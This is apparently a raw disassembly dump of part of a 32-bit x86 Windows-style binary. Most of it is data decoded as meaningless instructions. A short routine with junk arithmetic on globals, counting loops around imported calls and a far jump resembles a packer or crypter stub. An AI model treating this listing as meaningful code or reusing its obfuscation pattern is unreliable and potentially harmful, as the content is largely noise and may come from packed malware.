  4057de:	outs   dx,DWORD PTR ds:[esi]
  4057df:	cs inc ecx
  4057e1:	je     0x405858
  4057e3:	xor    al,0xfe
  4057e5:	call   0xe962f424
  4057ea:	ins    BYTE PTR es:[edi],dx
  4057eb:	stos   BYTE PTR es:[edi],al
  4057ec:	fs js  0x405843
  4057ef:	and    al,0x6
  4057f1:	data16 mov dh,0xc8
  4057f4:	je     0x4057d6
  4057f6:	lods   al,BYTE PTR ds:[esi]
  4057f7:	xchg   ebx,eax
  4057f8:	mov    esp,0x4739a5a8
  4057fd:	(bad)  
  4057fe:	sbb    dl,bl
  405800:	sbb    ebx,esi
  405802:	call   0x840:0x7ecd7bcf
  405809:	mov    ebp,0x4014ad15
  40580e:	xchg   esp,eax
  40580f:	clc    
  405810:	mov    edi,0x6dec7a8f
  405815:	dec    edi
  405816:	and    ah,BYTE PTR [edx-0x7f]
  405819:	adc    eax,0xce386004
  40581e:	cdq    
  40581f:	pop    ebx
  405820:	mov    ebx,0x5418a3ec
  405825:	dec    ebx
  405826:	pop    ebx
  405827:	cmp    eax,edx
  405829:	enter  0x9c50,0x3
  40582d:	lahf   
  40582e:	xchg   ebp,eax
  40582f:	fwait
  405830:	sbb    ebx,DWORD PTR [ecx]
  405832:	fwait
  405833:	lea    esp,[esi+0x19]
  405836:	add    ebp,DWORD PTR [edx]
  405838:	ja     0x4057e6
  40583a:	and    dh,BYTE PTR ds:0xe0276354
  405840:	inc    ebx
  405841:	cmp    ah,BYTE PTR [ecx+0x12]
  405844:	mov    DWORD PTR [edx-0x6],edx
  405847:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405848:	test   al,0xa
  40584a:	sub    DWORD PTR [ebx-0x60],edx
  40584d:	fcomp  QWORD PTR [edx+0xdb5c322]
  405853:	jecxz  0x4058bb
  405855:	aaa    
  405856:	pop    esi
  405857:	mov    bh,0xf6
  405859:	push   ebx
  40585a:	mov    bl,0xb3
  40585c:	lock push 0xa
  40585f:	fiadd  DWORD PTR [ecx-0x32]
  405862:	push   ds
  405863:	and    edx,DWORD PTR ds:0x6ede96fa
  405869:	mov    al,ds:0xfe339616
  40586e:	pop    ss
  40586f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405870:	fisub  DWORD PTR [esp+eax*8+0x41]
  405874:	jbe    0x4058c1
  405876:	jno    0x405805
  405878:	test   al,0x9d
  40587a:	bound  ecx,QWORD PTR [ebp+0x3d]
  40587d:	dec    edi
  40587e:	and    al,ah
  405880:	call   DWORD PTR [ebp+ebp*2-0x74]
  405884:	jae    0x405816
  405886:	push   0xc9bd6caa
  40588b:	mov    ds:0x2e5b44ba,eax
  405890:	and    al,bl
  405892:	sub    eax,0x96662eb1
  405897:	lock push esi
  405899:	add    eax,0x4707e6de
  40589e:	cmp    bh,BYTE PTR ds:0x1956a719
  4058a4:	jnp    0x405905
  4058a6:	xchg   ecx,eax
  4058a7:	shr    BYTE PTR [edx+0x2f],cl
  4058aa:	or     ch,BYTE PTR [edx+0x6b6feac9]
  4058b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058b1:	repnz or DWORD PTR [edi+0x636567a3],ecx
  4058b8:	pop    ebp
  4058b9:	dec    edi
  4058ba:	outs   dx,BYTE PTR ds:[esi]
  4058bb:	aaa    
  4058bc:	mov    ds:0xec2a1086,eax
  4058c1:	(bad)  
  4058c2:	mov    cl,0x9a
  4058c4:	mov    eax,ds:0xc7e2c590
  4058c9:	jbe    0x4058d4
  4058cb:	(bad)  
  4058cc:	std    
  4058cd:	jecxz  0x405864
  4058cf:	sti    
  4058d0:	pop    ds
  4058d1:	int    0x2a
  4058d3:	push   esi
  4058d4:	and    al,0xd1
  4058d6:	push   ebp
  4058d7:	cmp    al,0xcd
  4058d9:	lods   al,BYTE PTR ds:[esi]
  4058da:	sbb    ecx,DWORD PTR [edx]
  4058dc:	inc    edi
  4058dd:	adc    dl,BYTE PTR ds:0xeb7759b5
  4058e3:	xchg   esi,eax
  4058e4:	pop    ss
  4058e5:	in     eax,0xc6
  4058e7:	and    eax,0x1ee267b9
  4058ec:	xchg   ebx,ebp
  4058ee:	fisttp QWORD PTR [eax]
  4058f0:	and    BYTE PTR [edi-0x7c57513],0xe5
  4058f7:	(bad)  
  4058f8:	loopne 0x405918
  4058fa:	imul   ebx,ebx,0x7d
  4058fd:	ret    0x7052
  405900:	push   es
  405901:	xlat   BYTE PTR ds:[ebx]
  405902:	arpl   WORD PTR [ecx+0x2a],si
  405905:	pop    edi
  405906:	add    ebx,esi
  405908:	lds    edx,FWORD PTR [eax-0x77039971]
  40590e:	ss out dx,al
  405910:	je     0x4058a7
  405912:	mov    bh,0xae
  405914:	lock test ch,ah
  405917:	(bad)  
  405918:	lock mov esi,0x25414ac7
  40591e:	jp     0x4058cf
  405920:	pop    ebx
  405921:	mov    edi,0xb83d88d8
  405926:	or     eax,0xcd08294d
  40592b:	(bad)  
  40592c:	jns    0x4058ce
  40592e:	jge    0x405966
  405930:	daa    
  405931:	pop    ebx
  405932:	pop    edi
  405933:	mov    cl,BYTE PTR [bp+si-0x64]
  405937:	inc    eax
  405938:	xchg   ebp,eax
  405939:	mov    esp,0xaffa1854
  40593e:	data16 fcmovnbe st,st(3)
  405941:	repz lock push DWORD PTR [edi]
  405945:	push   edi
  405946:	mov    cl,0x41
  405948:	clc    
  405949:	push   ecx
  40594a:	xchg   BYTE PTR [esi+0x47],ah
  40594d:	xchg   BYTE PTR [edx+0x7],bh
  405950:	jmp    0xc994:0x4bb8ab50
  405957:	mov    al,0x7a
  405959:	call   0xa8af54ec
  40595e:	(bad)  [ecx]
  405960:	jmp    0x40594e
  405962:	jbe    0x405970
  405964:	pushf  
  405965:	idiv   DWORD PTR [edx+ecx*1+0x21124b2b]
  40596c:	hlt    
  40596d:	adc    bh,BYTE PTR [edi-0x7a]
  405970:	fbstp  TBYTE PTR [eax+0x2ecea447]
  405976:	cld    
  405977:	pop    ebx
  405978:	adc    edi,DWORD PTR [ebx+ebp*4+0x54561934]
  40597f:	out    0xb0,eax
  405981:	je     0x4059bc
  405983:	repnz fwait
  405985:	adc    BYTE PTR [eax+0x31],al
  405988:	mov    ah,0xbb
  40598a:	mov    bh,0x67
  40598c:	stos   BYTE PTR es:[edi],al
  40598d:	xor    esi,ecx
  40598f:	cli    
  405990:	pop    ss
  405991:	mov    al,0xb2
  405993:	jbe    0x405a13
  405995:	inc    edx
  405996:	push   ecx
  405997:	pop    ds
  405998:	mov    al,ds:0xf18dcd0f
  40599d:	pop    es
  40599e:	xchg   DWORD PTR [ebp+ebp*8-0x2d],ebx
  4059a2:	in     eax,dx
  4059a3:	jl     0x4059a9
  4059a5:	and    ah,0xc7
  4059a8:	pop    edx
  4059a9:	call   0x40dfc284
  4059ae:	and    al,0x87
  4059b0:	dec    esi
  4059b1:	fsub   QWORD PTR [ecx]
  4059b3:	repz mov bl,0x40
  4059b6:	add    DWORD PTR [edi],edx
  4059b8:	lea    esp,[edx+0xb621732]
  4059be:	jns    0x405a37
  4059c0:	enter  0xdb43,0x4c
  4059c4:	jb     0x405946
  4059c6:	cwde   
  4059c7:	outs   dx,BYTE PTR ds:[esi]
  4059c8:	lea    edx,[edx]
  4059ca:	ficom  DWORD PTR [eax]
  4059cc:	aas    
  4059cd:	popa   
  4059ce:	xor    BYTE PTR [ebx],ah
  4059d0:	mov    ch,0xf9
  4059d2:	mov    ecx,0x4489d7ae
  4059d7:	dec    ebx
  4059d8:	ret    
  4059d9:	sub    eax,0xb00d38d7
  4059de:	push   0x7f
  4059e0:	pushf  
  4059e1:	bound  esp,QWORD PTR [ecx-0x71]
  4059e4:	(bad)
  4059e8:	mov    ecx,0xba9c624a
  4059ed:	jmp    0xdea6:0xcb07f07c
  4059f4:	out    0xe4,eax
  4059f6:	ds ds stos BYTE PTR es:[edi],al
  4059f9:	outs   dx,DWORD PTR ds:[esi]
  4059fa:	lods   al,BYTE PTR ds:[esi]
  4059fb:	sti    
  4059fc:	mov    ebx,0x8f8ac9ba
  405a01:	test   al,0xcd
  405a03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a04:	aas    
  405a05:	das    
  405a06:	call   DWORD PTR [eax-0xc3abb68]
  405a0c:	(bad)  
  405a0e:	arpl   WORD PTR [esp+eiz*2],di
  405a11:	ins    BYTE PTR es:[edi],dx
  405a12:	mov    cl,0x26
  405a14:	(bad)  
  405a15:	dec    esp
  405a16:	add    ebp,DWORD PTR [ecx+0x601cb964]
  405a1c:	and    DWORD PTR [esi-0x1107aa17],eax
  405a22:	out    0x91,al
  405a24:	(bad)  
  405a25:	mov    esp,0xa2b5cf9a
  405a2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a2b:	jo     0x405a0e
  405a2d:	jns    0x4059fa
  405a2f:	sub    ecx,DWORD PTR [edx+0x15f5d9c0]
  405a35:	dec    ecx
  405a36:	in     eax,0x5d
  405a38:	pop    ss
  405a39:	pop    edi
  405a3a:	ret    0xec43
  405a3d:	data16 out 0x92,al
  405a40:	dec    edi
  405a41:	and    edx,DWORD PTR [edx*1+0x11806b51]
  405a48:	cmc    
  405a49:	xchg   edx,eax
  405a4a:	loopne 0x405a41
  405a4c:	adc    ebp,0xd7c937ab
  405a52:	push   edi
  405a53:	fwait
  405a54:	sub    BYTE PTR [edx],cl
  405a56:	(bad)  
  405a57:	mov    ebx,0x6a8b7f8e
  405a5c:	rol    ah,cl
  405a5e:	outs   dx,BYTE PTR ds:[esi]
  405a5f:	cwde   
  405a60:	jmp    0xcfe2d9ec
  405a65:	(bad)  
  405a66:	int    0x7c
  405a68:	push   0x43
  405a6a:	dec    ecx
  405a6b:	xlat   BYTE PTR ds:[ebx]
  405a6c:	mov    ch,0x5b
  405a6e:	(bad)  
  405a6f:	test   eax,0x45002a49
  405a74:	fisubr DWORD PTR [esi+0x6b33603]
  405a7a:	sub    BYTE PTR [edx+0x78207cb7],al
  405a80:	fldcw  WORD PTR [eax+0x56]
  405a83:	sar    DWORD PTR [edx+0x31],1
  405a86:	ins    DWORD PTR es:[edi],dx
  405a87:	mov    eax,ds:0xd965abd6
  405a8c:	inc    edx
  405a8d:	jne    0x405a44
  405a8f:	xlat   BYTE PTR ds:[ebx]
  405a90:	and    edx,DWORD PTR [ebp+0x5f]
  405a93:	sti    
  405a94:	xor    ebp,DWORD PTR [eax-0x3]
  405a97:	dec    edx
  405a98:	and    bh,BYTE PTR [esi]
  405a9a:	frstor [eax-0x3aa1698b]
  405aa0:	rcr    BYTE PTR [esi],cl
  405aa2:	hlt    
  405aa3:	push   eax
  405aa4:	mov    ds:0xe3a16919,al
  405aa9:	shl    BYTE PTR [ecx+0x13],cl
  405aac:	rep ins DWORD PTR es:[edi],dx
  405aae:	mov    eax,0x2aed493c
  405ab3:	iret   
  405ab4:	mov    bl,0x32
  405ab6:	sbb    BYTE PTR [edi],0xc2
  405ab9:	sub    DWORD PTR [ebx-0x6a],ebx
  405abc:	fidiv  DWORD PTR [ecx+0x5]
  405abf:	xchg   esp,eax
  405ac0:	in     eax,dx
  405ac1:	cmp    DWORD PTR [ebp+0x7f465ee6],0xffffffd3
  405ac8:	jmp    0xa8911e20
  405acd:	pusha  
  405ace:	aam    0xff
  405ad0:	inc    esi
  405ad1:	add    DWORD PTR [ebx],edx
  405ad3:	dec    ebp
  405ad4:	inc    edx
  405ad5:	push   esi
  405ad6:	mov    ebx,0x579845c7
  405adb:	sbb    DWORD PTR [esi+0x79],ecx
  405ade:	test   al,0xa3
  405ae0:	lahf   
  405ae1:	xor    eax,0x34f8090
  405ae6:	sub    DWORD PTR [eax+0x25],edi
  405ae9:	clc    
  405aea:	pop    esp
  405aeb:	pop    ebx
  405aec:	icebp  
  405aed:	adc    ebp,DWORD PTR [edx]
  405aef:	clc    
  405af0:	fndisi(8087 only) 
  405af2:	mov    al,ds:0x8932ca7
  405af7:	jbe    0x405b6a
  405af9:	retf   0x36f9
  405afc:	add    al,0x4b
  405afe:	cdq    
  405aff:	adc    dh,BYTE PTR [ebx]
  405b01:	mov    WORD PTR [edx+0x6],?
  405b04:	add    ch,cl
  405b06:	mov    ds:0x5990bae3,al
  405b0b:	call   0x726a:0xcc9725c1
  405b12:	rol    BYTE PTR [eax+0x22663e1a],1
  405b18:	fcmovne st,st(5)
  405b1a:	jecxz  0x405abf
  405b1c:	adc    eax,0x53ad7864
  405b21:	push   eax
  405b22:	push   es
  405b23:	jne    0x405b32
  405b25:	mov    ebp,0xb52c2c60
  405b2a:	xchg   edx,ebx
  405b2c:	push   ecx
  405b2d:	mov    eax,ds:0xb690f080
  405b32:	rcl    DWORD PTR [edi+0x3e],0x7a
  405b36:	idiv   DWORD PTR [esp+esi*2-0x65e197ed]
  405b3d:	mov    fs,WORD PTR [ebp+0x4b722df9]
  405b43:	inc    esp
  405b44:	mov    eax,0xa80b80af
  405b49:	mov    cl,0x14
  405b4b:	fidivr DWORD PTR [edi+0x1232fe41]
  405b51:	jmp    0x405afa
  405b53:	cwde   
  405b54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b56:	lock adc eax,0xac1a31ae
  405b5c:	loope  0x405b9a
  405b5e:	mov    cl,0x12
  405b60:	outs   dx,BYTE PTR ds:[esi]
  405b61:	nop
  405b62:	and    DWORD PTR [edi],edx
  405b64:	xlat   BYTE PTR ds:[ebx]
  405b65:	in     al,dx
  405b66:	cli    
  405b67:	popa   
  405b68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b69:	jl     0x405b71
  405b6b:	frstor [ebp+0x76]
  405b6e:	push   ebx
  405b6f:	jno    0x405b6a
  405b71:	xor    eax,DWORD PTR [eax-0x65]
  405b74:	(bad)  
  405b75:	ins    DWORD PTR es:[edi],dx
  405b76:	inc    edi
  405b77:	ins    BYTE PTR es:[edi],dx
  405b78:	test   DWORD PTR [esi],0x66a631
  405b7e:	pop    es
  405b7f:	xor    DWORD PTR [ebx+0x35],ecx
  405b82:	cmp    DWORD PTR ds:0x5afd67c7,esp
  405b88:	xor    BYTE PTR [esi+eiz*1+0x41a48506],bh
  405b8f:	gs fs jecxz 0x405c00
  405b93:	mov    edx,0x56fe6c1
  405b98:	int    0xa2
  405b9a:	pop    edx
  405b9b:	jno    0x405ba9
  405b9d:	sbb    al,0xd2
  405b9f:	and    ah,0x36
  405ba2:	push   ebx
  405ba3:	rol    DWORD PTR [edi],cl
  405ba5:	(bad)  
  405ba7:	sbb    BYTE PTR [ebp+ebp*8-0x6f],ah
  405bab:	push   edx
  405bac:	mov    dl,0x31
  405bae:	das    
  405baf:	stos   BYTE PTR es:[edi],al
  405bb0:	mov    ds:0x21ee895b,eax
  405bb5:	xor    eax,ecx
  405bb7:	aas    
  405bb8:	pop    edx
  405bb9:	or     al,0xd2
  405bbb:	add    BYTE PTR [eax-0x5d255f01],0x6b
  405bc2:	pushf  
  405bc3:	fsubr  st(4),st
  405bc5:	and    DWORD PTR [edi],eax
  405bc7:	retf   0x9fdd
  405bca:	inc    edx
  405bcb:	imul   esi,DWORD PTR [edx-0x252c374f],0x45
  405bd2:	jmp    0x405bed
  405bd4:	outs   dx,BYTE PTR ds:[esi]
  405bd5:	lahf   
  405bd6:	call   0xa23ed681
  405bdb:	pop    bp
  405bdd:	push   ebp
  405bde:	popf   
  405bdf:	or     al,0xf2
  405be1:	pop    es
  405be2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405be3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405be4:	or     ch,BYTE PTR [edi-0x2d]
  405be7:	mov    ch,0x39
  405be9:	xor    dl,0x36
  405bec:	push   es
  405bed:	shl    ah,1
  405bef:	add    eax,0x4f18c154
  405bf4:	inc    edi
  405bf5:	dec    edx
  405bf6:	inc    eax
  405bf7:	in     al,dx
  405bf8:	jge    0x405ba9
  405bfa:	pop    es
  405bfb:	cmp    DWORD PTR [ebx-0x30f47cad],ecx
  405c01:	mov    eax,ds:0x4d789256
  405c06:	mov    ds:0x32d63f95,al
  405c0b:	sub    bl,BYTE PTR [ebp-0x4bc0ec67]
  405c11:	jmp    0xdcad:0x92a6bc68
  405c18:	mov    ebp,DWORD PTR [ecx]
  405c1a:	ins    DWORD PTR es:[edi],dx
  405c1b:	adc    eax,0x2453fc8b
  405c20:	pop    ecx
  405c21:	sbb    eax,0xd7606298
  405c26:	cwde   
  405c27:	mov    edx,0xe4551a6e
  405c2c:	adc    BYTE PTR [ebp+0x5e3b5960],bl
  405c32:	out    0xe9,eax
  405c34:	dec    ebx
  405c35:	lea    ebx,[esi+0x5582b1e9]
  405c3b:	push   cs
  405c3c:	aam    0xe2
  405c3e:	pop    edx
  405c3f:	sbb    eax,DWORD PTR ss:[ebp+0xa0f96a9]
  405c46:	dec    ecx
  405c47:	clc    
  405c48:	fs scas al,BYTE PTR es:[edi]
  405c4a:	sub    al,0xc0
  405c4c:	inc    DWORD PTR [esi+0x2d999b74]
  405c52:	push   ecx
  405c53:	and    DWORD PTR [edx-0x2ba6de3b],0x5d0e3bde
  405c5d:	(bad)  
  405c5e:	mov    cl,0xe6
  405c60:	adc    bl,ch
  405c62:	jl     0x405c56
  405c64:	(bad)  
  405c65:	jae    0x405ca7
  405c67:	mov    esi,0x5f90fb93
  405c6c:	pop    esi
  405c6d:	leave  
  405c6e:	ret    
  405c6f:	push   ebp
  405c70:	mov    ebp,esp
  405c72:	sub    esp,0x58
  405c75:	add    DWORD PTR ds:0x429008,0x42b004
  405c7f:	push   ebx
  405c80:	adc    DWORD PTR ds:0x42a018,0x429010
  405c8a:	push   esi
  405c8b:	push   edi
  405c8c:	and    DWORD PTR ds:0x42c00c,0x6433
  405c96:	push   0x1f
  405c98:	lea    eax,[ebp-0x58]
  405c9b:	push   eax
  405c9c:	adc    DWORD PTR ds:0x42a010,0x6fdc
  405ca6:	push   0x0
  405ca8:	sub    DWORD PTR ds:0x42b018,0x7ba7
  405cb2:	call   DWORD PTR ds:0x424034
  405cb8:	call   DWORD PTR ds:0x424004
  405cbe:	and    DWORD PTR ds:0x42a000,0x4473
  405cc8:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  405ccf:	and    DWORD PTR ds:0x429018,0x0
  405cd9:	mov    ebx,DWORD PTR ds:0x429018
  405cdf:	inc    ebx
  405ce0:	mov    DWORD PTR ds:0x429018,ebx
  405ce6:	cmp    DWORD PTR ds:0x429018,0x1f
  405ced:	jne    0x405d03
  405cf3:	push   0x42b00c
  405cf8:	push   0x7f05
  405cfd:	call   DWORD PTR ds:0x42403c
  405d03:	cmp    DWORD PTR ds:0x429018,0x19
  405d0a:	jb     0x405cd9
  405d10:	add    ebx,DWORD PTR ds:0x42a008
  405d16:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  405d1d:	mov    ecx,DWORD PTR [ebp-0x4]
  405d20:	mov    ebx,0x7510893
  405d25:	xor    ecx,ebx
  405d27:	or     DWORD PTR ds:0x42b00c,edx
  405d2d:	mov    eax,0x3272db
  405d32:	add    ecx,eax
  405d34:	sub    DWORD PTR ds:0x42a010,0x429004
  405d3e:	mov    DWORD PTR [ebp-0x1c],ecx
  405d41:	mov    ecx,DWORD PTR [ebp+0x14]
  405d44:	mov    DWORD PTR ds:0x42800c,0x25aa
  405d4e:	test   ecx,ecx
  405d50:	mov    DWORD PTR ds:0x428000,0x5e1a
  405d5a:	je     0x405d78
  405d60:	sub    DWORD PTR ds:0x42b018,0x6b15
  405d6a:	mov    ecx,DWORD PTR [ebp+0x14]
  405d6d:	mov    ecx,DWORD PTR [ecx]
  405d6f:	add    DWORD PTR ds:0x42a000,ecx
  405d75:	mov    DWORD PTR [ebp-0x1c],ecx
  405d78:	and    DWORD PTR ds:0x42a010,0x0
  405d82:	mov    edi,DWORD PTR ds:0x42a010
  405d88:	inc    edi
  405d89:	mov    DWORD PTR ds:0x42a010,edi
  405d8f:	cmp    DWORD PTR ds:0x42a010,0x9
  405d96:	jne    0x405daa
  405d9c:	push   DWORD PTR [ebp-0x14]
  405d9f:	push   0x423583
  405da4:	call   DWORD PTR ds:0x424040
  405daa:	cmp    DWORD PTR ds:0x42a010,0x8
  405db1:	jne    0x405dc4
  405db7:	mov    edi,DWORD PTR ds:0x42a010
  405dbd:	inc    edi
  405dbe:	mov    DWORD PTR ds:0x42a010,edi
  405dc4:	cmp    DWORD PTR ds:0x42a010,0x13
  405dcb:	jb     0x405d82
  405dd1:	mov    ecx,0x457a
  405dd6:	imul   edx,eax
  405dd9:	mov    esi,0x787f
  405dde:	or     DWORD PTR ds:0x428004,0x4238
  405de8:	add    edx,ecx
  405dea:	sbb    DWORD PTR ds:0x429014,0x4641
  405df4:	jmp    0x40819c
  405df9:	jecxz  0x405d80
  405dfb:	cmp    eax,0x636a9b92
  405e00:	sbb    esp,0xffffffb2
  405e03:	fild   WORD PTR [ecx+0x34000ea4]
  405e09:	push   edx
  405e0a:	cmp    esp,DWORD PTR [edx+0x62]
  405e0d:	neg    DWORD PTR [edi+0x62]
  405e10:	bound  edi,QWORD PTR [eax+0x24]
  405e13:	dec    edi
  405e14:	cs adc edi,ebp
  405e17:	mov    edx,0xf4c619b8
  405e1c:	nop
  405e1d:	push   ebp
  405e1e:	ins    BYTE PTR es:[edi],dx
  405e1f:	lods   eax,DWORD PTR ds:[esi]
  405e20:	das    
  405e21:	jns    0x405e6e
  405e23:	jmp    0xb2bd:0x9732c38
  405e2a:	jo     0x405e16
  405e2c:	cmp    eax,0x2289aeaf
  405e31:	cmp    edi,DWORD PTR [ebx+0x10]
  405e34:	test   BYTE PTR fs:[ecx-0x62],ah
  405e38:	rcr    DWORD PTR [esi-0x60b2a57e],1
  405e3e:	aad    0xfe
  405e40:	cld    
  405e41:	xchg   ecx,eax
  405e42:	sub    eax,0xa393910a
  405e47:	add    DWORD PTR [edx+0x74],0x193e9154
  405e4e:	out    dx,al
  405e4f:	and    eax,0x27e41db0
  405e54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e55:	mov    dh,0x1e
  405e57:	not    DWORD PTR [eax]
  405e59:	shl    BYTE PTR [ebx+0x3f],1
  405e5c:	xchg   edi,eax
  405e5d:	cmp    eax,0xaa8aff8f
  405e62:	or     DWORD PTR [esi+0x7a],esi
  405e65:	push   edi
  405e66:	push   edi
  405e67:	sub    esp,DWORD PTR [edi-0x6c85d633]
  405e6d:	sub    eax,0xabc2c332
  405e72:	add    esi,DWORD PTR [ecx+ecx*1]
  405e75:	push   DWORD PTR [edx]
  405e77:	scas   al,BYTE PTR es:[edi]
  405e78:	mov    dl,0x72
  405e7a:	sub    al,cl
  405e7c:	sub    eax,0xb419982
  405e81:	pop    edx
  405e82:	fdiv   st(4),st
  405e84:	xchg   ebx,eax
  405e85:	jae    0x405e43
  405e87:	mov    edi,0x392fbc82
  405e8c:	(bad)  
  405e8d:	cmp    DWORD PTR [esi],eax
  405e8f:	bndstx [ecx],(bad)
  405e92:	cmp    esp,0x6f96f69c
  405e98:	mov    ds:0xf496e9bb,eax
  405e9d:	and    dl,BYTE PTR [esi-0x5]
  405ea0:	mov    es:0x7319b46,eax
  405ea6:	mov    dh,0x59
  405ea8:	inc    edx
  405ea9:	mov    fs:0x92e54323,eax
  405eaf:	mov    esp,0x32acc8ca
  405eb4:	mov    al,ds:0xb948f907
  405eb9:	cmp    eax,ecx
  405ebb:	inc    eax
  405ebc:	ins    DWORD PTR es:[edi],dx
  405ebd:	inc    esp
  405ebe:	aam    0x4a
  405ec0:	stos   BYTE PTR es:[edi],al
  405ec1:	lock push edx
  405ec3:	cdq    
  405ec4:	mov    eax,0xb48c6596
  405ec9:	in     al,0xb0
  405ecb:	mov    al,cl
  405ecd:	pusha  
  405ece:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ecf:	fwait
  405ed0:	daa    
  405ed1:	mov    al,al
  405ed3:	cmovge esp,DWORD PTR [eax]
  405ed6:	fcomi  st,st(4)
  405ed8:	mov    eax,ds:0x6a004f56
  405edd:	nop
  405ede:	pop    esp
  405edf:	test   BYTE PTR [ebx-0x2a],dl
  405ee2:	fdivr  QWORD PTR [edi+0x300f2887]
  405ee8:	jge    0x405e6f
  405eea:	js     0x405f5d
  405eec:	or     ebp,ebp
  405eee:	cmc    
  405eef:	sub    edx,DWORD PTR [esi-0x25]
  405ef2:	ja     0x405f1c
  405ef4:	out    0xe8,eax
  405ef6:	jmp    0x19d71540
  405efb:	dec    esp
  405efc:	stos   DWORD PTR es:[edi],eax
  405efd:	(bad)  
  405efe:	mov    ch,0x5b
  405f00:	outs   dx,DWORD PTR ds:[esi]
  405f01:	rol    BYTE PTR [esi],0x79
  405f04:	rcl    ebx,1
  405f06:	mov    edx,0xfb5c62b8
  405f0b:	ja     0x405f40
  405f0d:	xchg   BYTE PTR [eax],dh
  405f0f:	pop    es
  405f10:	neg    BYTE PTR [edi]
  405f12:	and    eax,0xdda8a952
  405f17:	rcl    al,1
  405f19:	popf   
  405f1a:	aaa    
  405f1b:	pop    ebp
  405f1c:	dec    esp
  405f1d:	ds jge 0x405f13
  405f20:	adc    DWORD PTR [edx],ecx
  405f22:	push   ecx
  405f23:	adc    cl,bh
  405f25:	xchg   ecx,eax
  405f26:	or     dl,BYTE PTR ds:0xd1090cd9
  405f2c:	mov    ds:0x2856cc59,al
  405f31:	xchg   BYTE PTR [esp+edi*1-0x495cba68],dh
  405f38:	adc    ebx,DWORD PTR [esi+ebx*1]
  405f3b:	xchg   bp,ax
  405f3d:	outs   dx,DWORD PTR ds:[esi]
  405f3e:	sub    esi,DWORD PTR [esp+edx*4+0x14eb71b5]
  405f45:	imul   esp,DWORD PTR [ebp+0x1e],0x196e593c
  405f4c:	adc    ah,BYTE PTR [eax+0x2cadcaeb]
  405f52:	and    ah,BYTE PTR [ecx+0x4d]
  405f55:	pop    ebx
  405f56:	stos   DWORD PTR es:[edi],eax
  405f57:	adc    al,0xda
  405f59:	std    
  405f5a:	inc    edx
  405f5b:	and    eax,0x910e572f
  405f60:	je     0x405ef3
  405f62:	mov    edi,0x690fa035
  405f67:	xchg   esi,eax
  405f68:	or     ebp,DWORD PTR [edx+0x68bec051]
  405f6e:	es add eax,0x94d9fd8e
  405f74:	inc    esp
  405f75:	pop    edx
  405f76:	fsubr  st,st(7)
  405f78:	fldenv [edx+0x66]
  405f7b:	xchg   edi,eax
  405f7c:	inc    esi
  405f7d:	adc    BYTE PTR [edi-0x2e1dd4bd],0xcb
  405f84:	adc    BYTE PTR [edx-0x81e5181],ah
  405f8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f8b:	les    ebp,FWORD PTR [esi+0x52fa7d94]
  405f91:	fild   QWORD PTR [edi+0x39bc33ec]
  405f97:	ror    edi,1
  405f99:	lods   eax,DWORD PTR ds:[esi]
  405f9a:	xchg   ebx,eax
  405f9b:	xchg   edi,eax
  405f9c:	outs   dx,DWORD PTR ds:[esi]
  405f9d:	xchg   edi,eax
  405f9e:	test   DWORD PTR [edx+0x6c04675f],0x2535703b
  405fa8:	mov    bh,0x14
  405faa:	daa    
  405fab:	dec    esi
  405fac:	dec    eax
  405fad:	and    bh,dl
  405faf:	aam    0xb4
  405fb1:	add    eax,0x2dc36a03
  405fb6:	jne    0x405f41
  405fb8:	sub    ebx,ebx
  405fba:	repz inc esi
  405fbc:	push   esp
  405fbd:	dec    esi
  405fbe:	outs   dx,DWORD PTR ds:[esi]
  405fbf:	pop    es
  405fc0:	aad    0xe4
  405fc2:	push   es
  405fc3:	and    DWORD PTR [ebx-0x274d1131],ebp
  405fc9:	rcr    BYTE PTR [ebx-0x62],1
  405fcc:	es sub eax,0x11364a7
  405fd2:	test   al,0x48
  405fd4:	es mov bl,0xd3
  405fd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405fd8:	(bad)  
  405fd9:	jmp    0x405fa4
  405fdb:	jae    0x405ff3
  405fdd:	sbb    DWORD PTR [esi],ebx
  405fdf:	fdivr  DWORD PTR [edi+0x45]
  405fe2:	add    BYTE PTR ds:0xe4482427,dl
  405fe8:	xlat   BYTE PTR ds:[ebx]
  405fe9:	adc    ebp,DWORD PTR [edi+ebp*4]
  405fec:	(bad)  
  405fed:	enter  0xfb68,0x53
  405ff1:	(bad)
  405ff5:	frstor [ebx-0x4c]
  405ff8:	pop    ss
  405ff9:	in     al,0xc4
  405ffb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ffc:	jl     0x405f82
  405ffe:	jno    0x406002
  406000:	push   es
  406001:	adc    DWORD PTR [ebx-0x20283a8b],ebp
  406007:	aam    0xfa
  406009:	or     bl,BYTE PTR [edx+0x25]
  40600c:	or     BYTE PTR [edi+0x40],ah
  40600f:	dec    esp
  406010:	lock add esi,ecx
  406013:	sub    ah,cl
  406015:	pop    eax
  406016:	repz push edx
  406018:	push   eax
  406019:	jb     0x405fd2
  40601b:	outs   dx,BYTE PTR ds:[esi]
  40601c:	repz arpl WORD PTR [eax+eax*2],dx
  406020:	pop    ecx
  406021:	mov    edx,0x740574b9
  406026:	mov    esi,0x38d2f64f
  40602b:	pop    esp
  40602c:	sub    ebp,DWORD PTR [edi]
  40602e:	adc    bl,BYTE PTR [edi+0x52]
  406031:	xor    al,BYTE PTR [ecx-0x63]
  406034:	sti    
  406035:	cdq    
  406036:	and    DWORD PTR [ecx-0x69283b89],ecx
  40603c:	mov    bh,0x69
  40603e:	call   0x9ee4fc4d
  406043:	loopne 0x405fd8
  406045:	mov    al,0xeb
  406047:	sti    
  406048:	jbe    0x4060ab
  40604a:	sub    DWORD PTR [esi-0x7],ebp
  40604d:	pop    es
  40604e:	iret   
  40604f:	push   ebp
